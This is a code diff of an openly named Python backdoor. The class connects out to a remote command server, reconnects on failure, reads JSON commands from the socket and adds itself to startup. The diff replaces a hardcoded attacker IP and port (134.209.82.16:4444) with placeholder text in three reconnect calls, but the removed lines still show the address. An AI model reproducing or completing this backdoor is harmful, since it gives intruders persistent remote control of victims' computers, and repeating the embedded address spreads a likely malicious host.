@@ -23,7 +23,7 @@ class Backdoor():
             self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             self.connection.connect((ip,port))
         except Exception:
-            my_backdoor=Backdoor("134.209.82.16",4444)
+            my_backdoor=Backdoor("SERVER IP",PORT NO)
             my_backdoor.run()
         self.addStartup()
         
@@ -53,7 +53,7 @@ class Backdoor():
                 json_data=json_data+self.connection.recv(10240000)
                 return json.loads(json_data)
             except Exception:#ValueError:
-                my_backdoor=Backdoor("134.209.82.16",4444)
+                my_backdoor=Backdoor("SERVER IP",PORT NO)
                 my_backdoor.run()
                 #continue
         
@@ -105,7 +105,7 @@ if __name__ =='__main__' :
 
     while True:#for i in l:
         try:
-            my_backdoor=Backdoor("134.209.82.16",4444)
+            my_backdoor=Backdoor("SERVER IP",PORT NO)
             my_backdoor.run()
 
         except Exception, KeyboardInterrupt:
